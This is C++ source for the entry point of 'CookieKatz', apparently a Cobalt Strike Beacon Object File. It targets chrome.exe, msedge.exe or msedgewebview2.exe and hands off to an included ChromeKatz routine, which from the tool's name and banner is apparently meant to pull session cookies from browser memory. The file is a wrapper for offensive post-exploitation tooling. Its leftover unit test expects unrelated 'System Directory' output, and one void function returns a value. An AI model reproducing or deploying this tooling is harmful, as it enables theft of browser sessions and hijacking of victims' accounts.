#include <Windows.h>
#include "base\helpers.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
#include "DFR.h"
#include "ChromeKatz/Process.cpp"

    //This is important!
    void banner() {
        formatp buffer;
        int bufsize = 512;
        BeaconFormatAlloc(&buffer, bufsize);
        BeaconFormatPrintf(&buffer, " _____             _    _      _   __      _       \n");
        BeaconFormatPrintf(&buffer, "/  __ \\           | |  (_)    | | / /     | |      \n");
        BeaconFormatPrintf(&buffer, "| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
        BeaconFormatPrintf(&buffer, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
        BeaconFormatPrintf(&buffer, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
        BeaconFormatPrintf(&buffer, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
        BeaconFormatPrintf(&buffer, "By Meckazin                      github.com/Meckazin \n");
        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
        BeaconFormatFree(&buffer);
    };

    //Example inputs:
    //  edge:   0a000000060000002f6564676500
    //  chrome: 0c000000080000002f6368726f6d6500
    void go(char* args, int len) {
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n\n");

#ifndef _WIN64
        BeaconPrintf(CALLBACK_OUTPUT, "32bit version is not currently supported.\n");
        return 1;
#endif // !_WIN64

        datap parser;
        BeaconDataParse(&parser, args, len);
        if (parser.original == 0)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome, /edge or /webview!\n");
            return;
        }

        LPCSTR targetConfig = BeaconDataExtract(&parser, NULL);
        LPCWSTR processName;
        if (_stricmp(targetConfig, "/chrome") == 0)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Chrome\n");
            processName = L"chrome.exe";
        }
        else if (_stricmp(targetConfig, "/edge") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Edge\n");
            processName = L"msedge.exe";
        }
        else if (_stricmp(targetConfig, "/webview") == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Msedgewebview2\n");
            processName = L"msedgewebview2.exe";
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge, /chrome or /webview to specify target!\n");
            return;
        }

        FindAllSuitableProcesses(processName);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif